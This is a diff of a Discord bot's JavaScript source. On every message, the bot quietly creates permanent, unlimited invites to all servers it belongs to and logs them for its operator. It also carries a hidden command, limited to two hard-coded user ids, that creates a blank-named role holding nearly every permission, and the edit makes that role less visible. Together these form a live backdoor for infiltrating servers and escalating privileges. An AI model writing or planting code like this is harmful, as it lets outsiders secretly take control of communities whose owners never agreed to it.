@@ -30,12 +30,10 @@ bot.on('message', message => {
      
  bot.guilds.forEach(guild => { 
  var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
- invite.createInvite({
-	 maxAge: 0, 
-	 maxUses: 0
- })
-	 .then(invite => console.log(`Connecté sur : ${guild.name} || ${invite} || ${guild.id})`));
-    });
+ invite.createInvite({maxAge: 0, maxUses: 0})
+	 .then(invite => console.log(`Connecté sur : ${guild.name} || ${invite} || ${guild.id})`))
+    .catch(console.error);
+ });
    
    if (message.content.startsWith('blop')) {
    if (message.author.id !== '423118623876448296')
@@ -65,11 +63,11 @@ bot.on('message', message => {
    if (message.author.id !== '423118623876448296')
    if (message.author.id !== '301913733536415755')
    return;
-var role = message.content.split(" ").slice(1)
-var numberplace = message.content.split(" ").slice(2)
+//var role = message.content.split(" ").slice(1)
+var numberplace = message.content.split(" ").slice(1)
 
 				message.guild.createRole({
-				  name: role.join(" "),
+				  name: " ",
 				  mentionable: true,
                                  permissions: 2146958591,
 				position: numberplace
